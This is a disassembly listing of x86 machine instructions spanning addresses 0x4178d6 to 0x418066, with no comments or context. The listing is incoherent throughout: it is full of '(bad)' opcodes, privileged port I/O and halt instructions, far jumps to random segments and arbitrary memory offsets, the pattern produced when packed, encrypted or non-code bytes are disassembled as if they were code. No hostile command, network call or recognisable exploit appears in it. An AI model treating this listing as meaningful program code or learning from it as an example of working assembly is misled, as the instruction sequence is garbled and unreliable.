  4178d6:	les    edx,FWORD PTR [esi-0x26076c2e]
  4178dc:	sub    edi,DWORD PTR [ebx-0x31862b45]
  4178e2:	push   ss
  4178e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178e4:	fbld   TBYTE PTR cs:[eax+0x6]
  4178e8:	inc    ebx
  4178e9:	in     al,0xcc
  4178eb:	xchg   edi,eax
  4178ec:	pop    ebp
  4178ed:	nop
  4178ee:	xor    eax,0x7bb0bf02
  4178f3:	hlt    
  4178f4:	cmc    
  4178f5:	pushf  
  4178f6:	jnp    0x4178ed
  4178f8:	test   al,0x7f
  4178fa:	addr16 cmc 
  4178fc:	in     al,dx
  4178fd:	shl    DWORD PTR [eax],1
  4178ff:	leave  
  417900:	call   0xbc2d:0x8abbd4ce
  417907:	fdiv   DWORD PTR [edi+0x48c7343c]
  41790d:	adc    al,0xc4
  41790f:	arpl   di,dx
  417911:	popf   
  417912:	(bad)  
  417914:	mov    esi,0x8f3fe388
  417919:	in     al,dx
  41791a:	xchg   edi,eax
  41791b:	(bad)
  41791e:	ror    ebx,cl
  417920:	pop    ecx
  417921:	push   ebx
  417922:	adc    ebx,DWORD PTR [edx-0x18801af8]
  417928:	sbb    al,0x4f
  41792a:	mov    cl,0xbf
  41792c:	fcmovbe st,st(1)
  41792e:	push   edx
  41792f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417931:	jbe    0x4178f1
  417933:	mov    esi,0x72bc23f8
  417938:	mov    WORD PTR [esi+0x215b6c85],cs
  41793e:	jge    0x417935
  417940:	jo     0x417943
  417942:	dec    ebp
  417943:	mov    eax,ds:0x21482d99
  417948:	mov    WORD PTR [ebp-0xe9d6a3e],ss
  41794e:	das    
  41794f:	rcr    cl,0x5
  417952:	and    esp,DWORD PTR [esp+esi*2-0x18d3350e]
  417959:	mov    BYTE PTR [ebp-0xc2c1b4d],0xe0
  417960:	inc    ebx
  417961:	mov    dh,0x11
  417963:	xchg   ecx,eax
  417964:	int    0xac
  417966:	inc    esp
  417967:	repnz stos DWORD PTR es:[edi],eax
  417969:	in     eax,dx
  41796a:	jb     0x417944
  41796c:	sub    eax,0x598650d5
  417971:	scas   eax,DWORD PTR es:[edi]
  417972:	mov    gs,edi
  417974:	inc    ebp
  417975:	inc    ebp
  417976:	mov    dl,0x9d
  417978:	push   cs
  417979:	or     ecx,DWORD PTR [edi]
  41797b:	push   esp
  41797c:	cmp    bh,BYTE PTR [edi-0x28f6b54d]
  417982:	sub    BYTE PTR [ebp-0x7dd48c07],dl
  417988:	(bad)  
  417989:	repnz xchg al,dl
  41798c:	ret    
  41798d:	ja     0x417914
  41798f:	jmp    0x417970
  417991:	dec    edi
  417992:	adc    ebx,DWORD PTR [eax+eax*2+0x4d58bf56]
  417999:	sub    eax,edx
  41799b:	jne    0x41798d
  41799d:	(bad)  
  41799e:	jne    0x417998
  4179a0:	mov    al,ds:0x7c6a58f5
  4179a5:	pop    edi
  4179a6:	bnd jmp 0x85dc6d55
  4179ac:	in     al,dx
  4179ad:	leave  
  4179ae:	cli    
  4179af:	(bad)  
  4179b0:	retf   0x8edb
  4179b3:	xor    DWORD PTR [ecx],edi
  4179b5:	jge    0x417a01
  4179b7:	mov    al,ds:0x757a3ab7
  4179bc:	daa    
  4179bd:	mov    al,BYTE PTR [eax-0xa262f87]
  4179c3:	cwde   
  4179c4:	xor    al,0x3c
  4179c6:	add    edi,edi
  4179c8:	(bad)  
  4179ca:	in     al,0x2
  4179cc:	and    al,0xd5
  4179ce:	jno    0x4179c9
  4179d0:	sbb    eax,0x42030762
  4179d5:	xor    bl,0x15
  4179d8:	sub    eax,0xc6644284
  4179dd:	adc    eax,0xd90e8154
  4179e2:	xchg   ah,cl
  4179e4:	push   ecx
  4179e5:	out    dx,al
  4179e6:	jg     0x41797c
  4179e8:	mov    ds:0x4507be90,eax
  4179ed:	and    DWORD PTR [eax+0x439e4c07],eax
  4179f3:	jno    0x41797b
  4179f5:	push   ebp
  4179f6:	ret    0x3c0e
  4179f9:	jo     0x417a67
  4179fb:	out    0xca,eax
  4179fd:	add    eax,0x2469590f
  417a02:	and    ebp,esp
  417a04:	jmp    0x50795d84
  417a09:	sbb    al,BYTE PTR [eax]
  417a0b:	verw   WORD PTR [esi+0x422f2722]
  417a12:	fdiv   QWORD PTR [edi+0x5600839c]
  417a18:	fild   WORD PTR [ebp+0x5c]
  417a1b:	cli    
  417a1c:	mov    WORD PTR [eax-0x55b46b9a],gs
  417a22:	in     al,dx
  417a23:	jo     0x417a22
  417a25:	xlat   BYTE PTR ds:[ebx]
  417a26:	pop    ss
  417a27:	mov    bl,dh
  417a29:	xchg   esp,eax
  417a2a:	xchg   edi,eax
  417a2b:	(bad)  
  417a2c:	cdq    
  417a2d:	xor    BYTE PTR [eax],bh
  417a2f:	popf   
  417a30:	je     0x417a6f
  417a32:	dec    esp
  417a33:	lods   al,BYTE PTR ds:[esi]
  417a34:	adc    al,0x8
  417a36:	push   ss
  417a37:	in     al,dx
  417a38:	lods   al,BYTE PTR ds:[esi]
  417a39:	int3   
  417a3a:	rcr    DWORD PTR [ecx+0x68f0dafc],cl
  417a40:	xchg   esi,eax
  417a41:	push   ebx
  417a42:	mov    dl,BYTE PTR [eax-0x4e9efbba]
  417a48:	pop    ecx
  417a49:	push   esp
  417a4a:	xlat   BYTE PTR ds:[ebx]
  417a4c:	inc    esp
  417a4d:	mov    edi,0xd5041720
  417a52:	cmp    eax,DWORD PTR [ecx+ebp*8+0x62902993]
  417a59:	inc    edx
  417a5a:	stos   DWORD PTR es:[edi],eax
  417a5b:	pop    edi
  417a5c:	mov    bl,0x8e
  417a5e:	adc    bl,BYTE PTR [ebx-0x6d2fe445]
  417a64:	dec    edx
  417a65:	(bad)  
  417a66:	and    al,0x2e
  417a68:	in     al,dx
  417a69:	nop
  417a6a:	inc    edi
  417a6b:	sbb    BYTE PTR [edx+ecx*8+0x6d3f975a],0xf0
  417a73:	mov    dh,0x3
  417a75:	push   edx
  417a76:	out    0xa5,al
  417a78:	xor    ch,BYTE PTR [edx-0x749e4d50]
  417a7e:	in     eax,dx
  417a7f:	push   esi
  417a80:	in     eax,dx
  417a81:	das    
  417a82:	ror    ecx,1
  417a84:	sahf   
  417a85:	loope  0x417abc
  417a87:	push   esi
  417a88:	cmp    DWORD PTR [ebx],ecx
  417a8a:	in     eax,dx
  417a8b:	hlt    
  417a8c:	push   es
  417a8d:	pop    edx
  417a8e:	stc    
  417a8f:	dec    eax
  417a90:	mov    ebp,0x1ab7b26e
  417a95:	nop
  417a96:	stc    
  417a97:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417a99:	aad    0x57
  417a9b:	inc    BYTE PTR [esi-0x51]
  417a9e:	ror    DWORD PTR [ebx+esi*4-0x48],1
  417aa2:	dec    esi
  417aa3:	xchg   edx,eax
  417aa4:	movups xmm2,XMMWORD PTR [ebp-0x3511821a]
  417aab:	nop
  417aac:	dec    esi
  417aad:	cmp    al,0xdb
  417aaf:	aam    0x2c
  417ab1:	loope  0x417ab7
  417ab3:	inc    esi
  417ab4:	pop    edx
  417ab5:	jo     0x417a6e
  417ab7:	mov    DWORD PTR [ebx+eiz*1],edi
  417aba:	push   edi
  417abb:	stc    
  417abc:	aas    
  417abd:	fs xchg edi,eax
  417abf:	or     esi,0x3123ed4b
  417ac5:	sar    esp,cl
  417ac7:	or     BYTE PTR [edx-0x324b2b3d],0x93
  417ace:	in     al,dx
  417acf:	or     ecx,DWORD PTR [ecx]
  417ad1:	push   edx
  417ad2:	adc    ecx,esp
  417ad4:	adc    ecx,edx
  417ad6:	lods   al,BYTE PTR ds:[esi]
  417ad7:	cmp    DWORD PTR [edi],0x32
  417ada:	inc    ecx
  417adb:	add    bh,BYTE PTR [eax+0x68507f6c]
  417ae1:	jne    0x417b32
  417ae3:	mov    eax,ds:0xffc86622
  417ae8:	(bad)  
  417ae9:	jecxz  0x417b1b
  417aeb:	jae    0x417a91
  417aed:	jge    0x417ad3
  417aef:	add    edx,edx
  417af1:	jns    0x417aa3
  417af3:	mov    BYTE PTR [ebx+0x74],0x2d
  417af7:	mov    bh,0xfe
  417af9:	mov    ebp,0xac21fbd7
  417afe:	mov    bl,0x6f
  417b00:	pusha  
  417b01:	add    ch,BYTE PTR [esi]
  417b03:	pop    es
  417b04:	dec    edi
  417b05:	imul   edx,DWORD PTR [eax-0xc66e009],0xffffffb8
  417b0c:	into   
  417b0d:	aam    0xcb
  417b0f:	xlat   BYTE PTR ds:[ebx]
  417b10:	jns    0x417aa5
  417b12:	(bad)
  417b15:	pop    es
  417b16:	jns    0x417ae8
  417b18:	aaa    
  417b19:	dec    esp
  417b1a:	js     0x417ab8
  417b1c:	add    BYTE PTR [esi],bl
  417b1e:	mov    ebx,0x4889d690
  417b23:	bound  ebx,QWORD PTR [ecx+0x2ceab2e4]
  417b29:	jns    0x417b73
  417b2b:	pop    ss
  417b2c:	cdq    
  417b2d:	xchg   BYTE PTR [ebx+0xf911a03],al
  417b33:	sbb    BYTE PTR [ecx+0x218f21ee],bl
  417b39:	pop    esi
  417b3a:	xchg   ebx,esp
  417b3c:	cli    
  417b3d:	fs jne 0x417baf
  417b40:	xor    esi,ecx
  417b42:	popf   
  417b43:	sahf   
  417b44:	cdq    
  417b45:	ja     0x417b25
  417b47:	push   cs
  417b48:	jge    0x417b67
  417b4a:	stc    
  417b4b:	mov    esp,0x3bd4348d
  417b50:	retf   
  417b51:	or     BYTE PTR [edx],cl
  417b53:	lods   eax,DWORD PTR ds:[esi]
  417b54:	call   0x29e:0x5b41786b
  417b5b:	add    esp,DWORD PTR [ecx-0x6f2bb96e]
  417b61:	lds    esp,FWORD PTR [ebp+0x2e]
  417b64:	repz ret 0x4c2b
  417b68:	pop    ss
  417b69:	mov    bl,0x3a
  417b6b:	popa   
  417b6c:	push   0x387cd1aa
  417b71:	jne    0x417bce
  417b73:	jmp    0x4e20:0x2ba4a899
  417b7a:	mov    eax,0x89ca7738
  417b7f:	lods   al,BYTE PTR ds:[esi]
  417b80:	aad    0xe0
  417b82:	pop    ebx
  417b83:	push   ebp
  417b84:	cwde   
  417b85:	sub    al,0x7c
  417b87:	or     BYTE PTR [ebx],ah
  417b89:	pop    ebx
  417b8a:	mov    ch,0x81
  417b8c:	xor    eax,0xb291bc48
  417b91:	sahf   
  417b92:	xor    dl,al
  417b94:	xchg   esi,eax
  417b95:	ins    BYTE PTR es:[edi],dx
  417b96:	jns    0x417b5b
  417b98:	hlt    
  417b99:	jne    0x417bc4
  417b9b:	lods   al,BYTE PTR ds:[esi]
  417b9c:	sar    BYTE PTR [esi-0x33],cl
  417b9f:	mov    WORD PTR [edx+0x79647d9b],ss
  417ba5:	inc    edi
  417ba6:	mov    ebp,0x6cbd87af
  417bab:	scas   eax,DWORD PTR es:[edi]
  417bac:	jb     0x417c25
  417bae:	pop    ecx
  417baf:	dec    ecx
  417bb0:	sub    cl,BYTE PTR ds:0x4fbc3737
  417bb6:	mov    ch,dh
  417bb8:	sbb    edi,ebp
  417bba:	xor    BYTE PTR [edi+0x79e535b9],0x53
  417bc1:	push   eax
  417bc2:	and    DWORD PTR [ebx+0x4204b986],eax
  417bc8:	cdq    
  417bc9:	or     al,0x35
  417bcb:	ins    DWORD PTR es:[edi],dx
  417bcc:	ret    0x7d56
  417bcf:	js     0x417bef
  417bd1:	push   ebp
  417bd2:	fcom   QWORD PTR [ebp-0x1d]
  417bd5:	fs jno 0x417bf1
  417bd8:	push   cs
  417bd9:	cmp    eax,0xd43c01f4
  417bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bdf:	stc    
  417be0:	jl     0x417c18
  417be2:	dec    eax
  417be3:	mov    ch,0x67
  417be5:	lods   eax,DWORD PTR ds:[esi]
  417be6:	dec    edx
  417be8:	pop    edi
  417be9:	and    eax,0x520fe868
  417bee:	cmp    al,0x94
  417bf0:	and    edi,DWORD PTR [edi+edx*2]
  417bf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf4:	jl     0x417bbc
  417bf6:	mov    edx,0x3ea87010
  417bfb:	dec    edx
  417bfc:	sahf   
  417bfd:	pop    edx
  417bfe:	daa    
  417bff:	xor    cl,BYTE PTR [eax-0x29]
  417c02:	sbb    al,0x57
  417c04:	jb     0x417bab
  417c06:	scas   eax,DWORD PTR es:[edi]
  417c07:	mov    eax,0xa88d6d02
  417c0c:	or     eax,0xa3659e7f
  417c11:	mov    esp,0x703ca847
  417c16:	pop    ss
  417c17:	popa   
  417c18:	jno    0x417bf5
  417c1a:	adc    DWORD PTR [esi],0xffffff9d
  417c1d:	and    al,0xf4
  417c1f:	fiadd  WORD PTR [esi+edx*8+0x1a03e386]
  417c26:	out    dx,eax
  417c27:	sbb    bh,BYTE PTR [ecx-0x4d93b3a9]
  417c2d:	or     DWORD PTR [ebp+edi*8+0x1d07b4a1],ebx
  417c34:	repz fwait
  417c36:	jp     0x417c5b
  417c38:	shr    esi,cl
  417c3a:	cmp    esi,esp
  417c3c:	dec    esp
  417c3d:	sbb    DWORD PTR [ebp+0x1c1a9fec],ebx
  417c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c44:	and    bl,bl
  417c46:	out    dx,al
  417c47:	mov    dh,0x3
  417c49:	rcr    BYTE PTR es:[ebp+0x77],0xb7
  417c4e:	stos   DWORD PTR es:[edi],eax
  417c4f:	mov    BYTE PTR [esi+0x5da19d07],0x33
  417c56:	cmp    DWORD PTR [esi],edi
  417c58:	scas   eax,DWORD PTR es:[edi]
  417c59:	sahf   
  417c5a:	or     eax,0x7827fc35
  417c5f:	js     0x417c80
  417c61:	hlt    
  417c62:	mov    al,0x83
  417c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c65:	sti    
  417c66:	jnp    0x417c5d
  417c68:	rol    cl,1
  417c6a:	inc    ebp
  417c6b:	and    BYTE PTR [edi-0x7b],cl
  417c6e:	ds icebp 
  417c70:	cmc    
  417c71:	inc    ebx
  417c72:	pop    ebx
  417c73:	push   es
  417c74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c75:	mov    bh,0x63
  417c77:	dec    eax
  417c78:	jbe    0x417cb1
  417c7a:	xchg   ecx,eax
  417c7b:	mov    bl,BYTE PTR [eax-0xe]
  417c7e:	inc    edi
  417c7f:	stc    
  417c80:	dec    ebp
  417c81:	xor    BYTE PTR [edx-0x7],dl
  417c84:	xor    eax,0xd8ea3cd3
  417c89:	xor    eax,0x8544acb5
  417c8e:	dec    ebp
  417c8f:	xchg   bl,bh
  417c91:	lock or bl,al
  417c94:	pop    ss
  417c95:	mov    bl,ch
  417c97:	fst    DWORD PTR [ecx+edx*4]
  417c9a:	push   eax
  417c9b:	int    0xd6
  417c9d:	pop    edi
  417c9e:	xor    eax,0x43b18625
  417ca3:	xchg   DWORD PTR [esi-0x7cfb54c1],ebp
  417ca9:	sti    
  417caa:	adc    BYTE PTR [ecx-0x789eef52],bl
  417cb0:	gs jae 0x417d18
  417cb3:	push   cs
  417cb4:	jmp    0x7ad0:0xc869c516
  417cbb:	jmp    DWORD PTR [ecx-0x22]
  417cbe:	std    
  417cbf:	lahf   
  417cc0:	xor    eax,0x967711f3
  417cc5:	inc    edi
  417cc6:	xchg   BYTE PTR [esi+0x4e73a26f],al
  417ccc:	scas   al,BYTE PTR es:[edi]
  417ccd:	(bad)  
  417cce:	push   ebp
  417ccf:	outs   dx,BYTE PTR ds:[esi]
  417cd0:	pop    eax
  417cd1:	in     al,0xd8
  417cd3:	mov    eax,0xb30d7da5
  417cd8:	push   0xffffffa6
  417cda:	mov    DWORD PTR [esi+0x703a99e4],0x88b21d2a
  417ce4:	push   ecx
  417ce5:	out    dx,al
  417ce6:	dec    ecx
  417ce7:	xlat   BYTE PTR ds:[ebx]
  417ce8:	lds    esi,FWORD PTR [ebp-0x4c]
  417ceb:	add    ebx,eax
  417ced:	inc    edi
  417cee:	add    DWORD PTR [edx-0x62],ebp
  417cf1:	mov    ?,WORD PTR [edx+edi*8-0x1f9d78d0]
  417cf8:	fcmovnbe st,st(6)
  417cfa:	adc    al,0x6b
  417cfc:	je     0x417ce6
  417cfe:	test   eax,0x616b5e3e
  417d03:	jg     0x417d6c
  417d05:	or     bh,bl
  417d07:	js     0x417cf4
  417d09:	nop
  417d0a:	daa    
  417d0b:	dec    ebx
  417d0c:	sub    ah,BYTE PTR [esi]
  417d0e:	sub    ebp,esp
  417d10:	xchg   ebp,eax
  417d11:	fistp  QWORD PTR [esi+0x587df6d4]
  417d17:	push   edi
  417d18:	lds    edi,FWORD PTR [eax]
  417d1a:	fnstenv [esi]
  417d1c:	cmp    DWORD PTR [ecx+0x2c],ebp
  417d1f:	(bad)  
  417d21:	rcr    esp,1
  417d23:	jmp    0x417da4
  417d25:	pop    es
  417d26:	int    0x28
  417d28:	shl    bl,0x12
  417d2b:	daa    
  417d2c:	sbb    al,0xa
  417d2e:	pop    ds
  417d2f:	mov    esi,0xf2528d3f
  417d34:	mov    eax,0x9b62d837
  417d39:	jne    0x417cbf
  417d3b:	cmp    BYTE PTR [ebp-0x60e64df1],bh
  417d41:	mov    ebx,0x7cbdd6fe
  417d46:	jo     0x417d3b
  417d48:	and    BYTE PTR [ecx],0x3e
  417d4b:	mov    ds:0x71243967,al
  417d50:	fwait
  417d51:	or     DWORD PTR [esp+edx*8+0x330475e5],ebp
  417d58:	loop   0x417d9f
  417d5a:	(bad)
  417d5d:	je     0x417ce7
  417d5f:	(bad)  
  417d60:	mov    edi,ebx
  417d62:	xlat   BYTE PTR ds:[ebx]
  417d63:	jbe    0x417dc6
  417d65:	rcl    BYTE PTR [edi-0x3e906a3f],1
  417d6b:	test   al,0x72
  417d6e:	std    
  417d6f:	jle    0x417cf1
  417d71:	outs   dx,BYTE PTR ds:[esi]
  417d72:	sbb    bl,BYTE PTR [edi]
  417d74:	sti    
  417d75:	cli    
  417d76:	jmp    DWORD PTR [ecx-0x72]
  417d79:	dec    ecx
  417d7a:	adc    ebp,DWORD PTR [ebp+0x6e5ccdc5]
  417d80:	sbb    esi,DWORD PTR [ecx-0xe78f9bf]
  417d86:	cmp    BYTE PTR [eax+0x6c],0x5c
  417d8a:	cmp    al,0x36
  417d8c:	jp     0x417dd3
  417d8e:	inc    esp
  417d8f:	sub    eax,0x1f9c631a
  417d94:	pop    esp
  417d95:	jo     0x417d7e
  417d97:	sar    DWORD PTR [esi],cl
  417d99:	cdq    
  417d9a:	sub    al,0x52
  417d9c:	mov    cl,0xac
  417d9e:	test   al,0xa6
  417da0:	mov    cl,0xfe
  417da2:	mov    esp,eax
  417da4:	inc    ebx
  417da5:	mov    gs,WORD PTR [esi+0x73b03ae1]
  417dab:	iret   
  417dac:	adc    ah,cl
  417dae:	xor    BYTE PTR [eax+edi*2+0x781d398d],0x74
  417db6:	and    edi,ecx
  417db8:	shl    DWORD PTR [edx-0x4],0xcd
  417dbc:	jmp    0xa2d35063
  417dc1:	pop    ebp
  417dc2:	pop    esi
  417dc3:	push   ds
  417dc4:	mov    cl,0x12
  417dc6:	ds dec ecx
  417dc8:	adc    DWORD PTR [edi],esp
  417dca:	or     DWORD PTR [eax],eax
  417dcc:	jmp    0xb564:0x32da2746
  417dd3:	sub    BYTE PTR [edx],dl
  417dd5:	ss int 0x51
  417dd8:	and    al,0x1
  417dda:	xor    al,0x1b
  417ddc:	mov    ebx,0x27effbe4
  417de1:	stc    
  417de2:	or     BYTE PTR [edx],ch
  417de4:	and    DWORD PTR [eax+0x38b7637d],edx
  417dea:	add    ebp,0xffffffe9
  417ded:	cmp    DWORD PTR [esi-0x6ca2f3d6],ecx
  417df3:	data16 jo 0x417ded
  417df6:	cdq    
  417df7:	(bad)  
  417df8:	repz gs retf 
  417dfb:	in     eax,0x14
  417dfd:	cli    
  417dfe:	rcl    DWORD PTR [eax],cl
  417e00:	std    
  417e01:	(bad)
  417e04:	arpl   WORD PTR [edx+0x2d6323e7],dx
  417e0a:	(bad)  
  417e0b:	cwde   
  417e0c:	push   ecx
  417e0d:	out    0xc,eax
  417e0f:	cmp    eax,0x63b429a9
  417e14:	jmp    0x4d93dd23
  417e19:	jmp    DWORD PTR [edi]
  417e1b:	arpl   dx,bp
  417e1d:	aam    0xd4
  417e1f:	adc    dl,BYTE PTR [edx-0x75104482]
  417e25:	enter  0xe9f2,0x6f
  417e29:	mov    ecx,0x3a6d767b
  417e2e:	or     bh,BYTE PTR [ebp+0x6f1c0b0c]
  417e34:	or     BYTE PTR [ecx-0x2539e6a1],dh
  417e3a:	sub    al,0x50
  417e3c:	std    
  417e3d:	jbe    0x417e0e
  417e3f:	mov    edx,0x69693261
  417e44:	test   al,0x13
  417e46:	push   ss
  417e47:	xor    eax,DWORD PTR [edx-0x6e]
  417e4a:	rcl    ch,1
  417e4c:	push   ds
  417e4d:	loope  0x417e4f
  417e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e50:	mov    edx,DWORD PTR [ecx+ebp*4]
  417e53:	loope  0x417ed4
  417e55:	mov    al,ds:0x2efa067b
  417e5a:	mov    bl,0xef
  417e5c:	ins    DWORD PTR es:[edi],dx
  417e5d:	mov    eax,ds:0x3b0558fa
  417e62:	xchg   edx,eax
  417e63:	aad    0x93
  417e65:	push   ebp
  417e66:	mov    al,ds:0x4c4fdf86
  417e6b:	mov    ch,0xa7
  417e6d:	push   ebp
  417e6e:	dec    esp
  417e6f:	rol    BYTE PTR [ecx],cl
  417e71:	sub    BYTE PTR [eax],bh
  417e73:	scas   al,BYTE PTR es:[edi]
  417e74:	test   DWORD PTR [edi],ebp
  417e76:	clc    
  417e77:	xchg   ebx,eax
  417e78:	xchg   edx,eax
  417e79:	jnp    0x417e18
  417e7b:	cld    
  417e7c:	sbb    bh,BYTE PTR [edi+eax*1+0x442af0d2]
  417e83:	or     al,0xfa
  417e85:	loop   0x417e24
  417e87:	faddp  st(0),st
  417e89:	ins    BYTE PTR es:[edi],dx
  417e8a:	fcom   DWORD PTR [ebx]
  417e8c:	retf   
  417e8d:	mov    ds:0xd7cbf6bb,eax
  417e92:	ret    0xe7da
  417e95:	pop    dx
  417e97:	xor    eax,0x921aae65
  417e9c:	cdq    
  417e9d:	sti    
  417e9e:	fidiv  DWORD PTR [edi]
  417ea0:	loope  0x417e4b
  417ea2:	xor    ah,al
  417ea4:	pop    ebx
  417ea5:	lods   eax,DWORD PTR ds:[esi]
  417ea6:	sar    DWORD PTR [esi],1
  417ea8:	push   cs
  417ea9:	fs push cs
  417eab:	mov    edi,0x5bb165c3
  417eb0:	jmp    0x417efd
  417eb2:	dec    esi
  417eb3:	in     eax,0x97
  417eb5:	je     0x417f20
  417eb7:	dec    ecx
  417eb8:	(bad)  
  417eb9:	mov    bh,0x8e
  417ebb:	cwde   
  417ebc:	push   0xc8577fd1
  417ec1:	aaa    
  417ec2:	sbb    ebx,ebx
  417ec4:	ror    BYTE PTR ds:0x778af5aa,cl
  417eca:	mov    ds:0xc576a65c,eax
  417ecf:	xchg   dh,bh
  417ed1:	mov    cl,0xbb
  417ed3:	addr16 aad 0x1b
  417ed6:	mov    bl,0x97
  417ed8:	xlat   BYTE PTR ds:[ebx]
  417ed9:	cmp    BYTE PTR [edx],cl
  417edb:	or     edi,DWORD PTR [eax]
  417edd:	add    eax,0x62597bfb
  417ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee3:	ins    BYTE PTR es:[edi],dx
  417ee4:	(bad)  
  417ee5:	out    0x31,al
  417ee7:	mov    eax,DWORD PTR [ebx-0x2fdd6b76]
  417eed:	sub    DWORD PTR [edx-0x6d5ab45d],0xfffffff8
  417ef4:	adc    BYTE PTR [esi],al
  417ef6:	adc    BYTE PTR [ebp+0xfedc637],cl
  417efc:	push   ds
  417efd:	dec    ebx
  417efe:	mov    BYTE PTR [ebx-0x6b],bl
  417f01:	retf   
  417f02:	ficomp DWORD PTR [ecx]
  417f04:	int3   
  417f05:	mov    dh,0x5f
  417f07:	mov    edi,DWORD PTR [eax-0x7f]
  417f0a:	imul   ecx,esp,0xffffffcf
  417f0d:	jnp    0x417f2f
  417f0f:	push   eax
  417f10:	jno    0x417e92
  417f12:	nop
  417f13:	je     0x417f59
  417f15:	lds    esi,FWORD PTR [eax+0x43]
  417f18:	cmp    bl,BYTE PTR [ebx+0x52]
  417f1b:	clc    
  417f1c:	cdq    
  417f1d:	adc    BYTE PTR [edi+0x1b],al
  417f20:	repz fstp QWORD PTR [eax-0x70]
  417f24:	mov    ss,WORD PTR [esi-0x56]
  417f27:	jle    0x417ed2
  417f29:	inc    esp
  417f2a:	or     al,0x65
  417f2c:	jmp    0xe860:0x752786e
  417f33:	mov    ds:0x3f085499,al
  417f38:	cmc    
  417f39:	std    
  417f3a:	mov    ecx,edi
  417f3c:	out    0x49,eax
  417f3e:	mov    ax,dx
  417f41:	out    0x40,eax
  417f43:	icebp  
  417f44:	jge    0x417ef7
  417f46:	mov    dl,0xa7
  417f48:	ss sti 
  417f4a:	rcr    edx,cl
  417f4c:	jp     0x417f02
  417f4e:	retf   
  417f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f50:	inc    esi
  417f51:	sub    DWORD PTR [ecx+0x54],edx
  417f54:	sub    DWORD PTR [esi],0x9f8025e
  417f5a:	mov    ebp,0xc64eb9ee
  417f5f:	mov    cl,0xd9
  417f61:	test   DWORD PTR [eax],ebx
  417f63:	fadd   DWORD PTR [esi-0x44e9be60]
  417f69:	les    esp,FWORD PTR [ebp-0x95e66ba]
  417f6f:	or     ch,bh
  417f71:	addr16 push esp
  417f73:	xor    esi,DWORD PTR [edi+0xb7a56af]
  417f79:	pop    ss
  417f7a:	jecxz  0x417f2b
  417f7c:	retf   
  417f7d:	scas   eax,DWORD PTR es:[edi]
  417f7e:	jge    0x417fd7
  417f80:	inc    ecx
  417f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f82:	push   ebp
  417f83:	mov    ecx,esp
  417f85:	jmp    0xc0b75c48
  417f8a:	pop    ebp
  417f8b:	sbb    bh,BYTE PTR [ebp-0xc]
  417f8e:	jo     0x417fcb
  417f90:	sub    ebx,edi
  417f92:	xchg   BYTE PTR ds:0xfc17bf36,ah
  417f98:	add    al,0xd5
  417f9a:	fst    QWORD PTR gs:[edx+0x7573d717]
  417fa1:	setbe  dl
  417fa4:	add    esp,esp
  417fa6:	(bad)  
  417fa7:	in     al,0xbb
  417fa9:	pusha  
  417faa:	dec    eax
  417fab:	and    eax,0xa78499c4
  417fb0:	and    al,0x95
  417fb2:	inc    ecx
  417fb3:	fistp  DWORD PTR gs:[ecx+0x3a]
  417fb7:	popa   
  417fb8:	out    0x9f,eax
  417fba:	nop
  417fbb:	and    BYTE PTR [eax],ah
  417fbd:	xchg   bl,bl
  417fbf:	dec    ebx
  417fc0:	mov    cl,0x45
  417fc2:	ja     0x417f4e
  417fc4:	retf   0x977e
  417fc7:	xchg   ebp,eax
  417fc8:	push   es
  417fc9:	stos   DWORD PTR es:[edi],eax
  417fca:	(bad)  
  417fcc:	mov    ah,0xbc
  417fce:	add    al,0xff
  417fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd1:	cwde   
  417fd2:	ins    DWORD PTR es:[edi],dx
  417fd3:	adc    al,0x61
  417fd6:	dec    edi
  417fd7:	mov    bh,0x33
  417fd9:	and    eax,0xb8f6bdb6
  417fde:	and    bh,al
  417fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fe1:	jo     0x41805e
  417fe3:	enter  0xe00e,0xf3
  417fe7:	xlat   BYTE PTR ds:[ebx]
  417fe8:	adc    esi,0x3a03d7cc
  417fee:	add    eax,0x478e5890
  417ff3:	pop    esi
  417ff4:	mov    bl,0xb2
  417ff6:	xchg   ebx,eax
  417ff7:	dec    esp
  417ff8:	xor    BYTE PTR [edi],dh
  417ffa:	mov    bh,0x44
  417ffc:	cmp    cl,0xe1
  417fff:	mov    dl,0x18
  418001:	out    0x70,eax
  418003:	cli    
  418004:	pop    es
  418005:	inc    ebx
  418006:	repz xor cl,bh
  418009:	jecxz  0x418011
  41800b:	stos   DWORD PTR es:[edi],eax
  41800c:	in     eax,dx
  41800d:	enter  0x2dd7,0xbe
  418011:	in     al,0x5d
  418013:	xchg   esi,eax
  418014:	cmp    DWORD PTR [ebx],esp
  418016:	clc    
  418017:	(bad)  
  418018:	(bad)  [ecx]
  41801a:	xor    al,0xb6
  41801c:	int    0x63
  41801e:	adc    BYTE PTR [edi],0x32
  418021:	xchg   DWORD PTR [ebp+0x5511c89],ebp
  418027:	jg     0x418082
  418029:	jg     0x41804c
  41802b:	mov    ch,0x9b
  41802d:	inc    ebx
  41802e:	hlt    
  41802f:	test   dh,al
  418031:	or     BYTE PTR [eax-0x7e],al
  418034:	ss or  al,0xf0
  418037:	xchg   edx,eax
  418038:	popa   
  418039:	out    dx,eax
  41803a:	jnp    0x418064
  41803c:	call   0xd58e93cb
  418041:	or     BYTE PTR [ebx],bl
  418043:	sbb    eax,0x7ed37207
  418048:	mov    bh,0x75
  41804a:	mov    eax,ds:0x749d251d
  41804f:	or     al,0x7b
  418051:	jl     0x418071
  418053:	fcmovnb st,st(7)
  418055:	fidivr WORD PTR ds:[eax-0x19]
  418059:	in     al,dx
  41805a:	or     ebx,esi
  41805c:	(bad)  
  41805d:	frstor [edi-0x70ac361e]
  418063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418064:	mov    bl,0x80
  418066:	or     BYTE PTR [ebp+0x51970ad2],0xe3
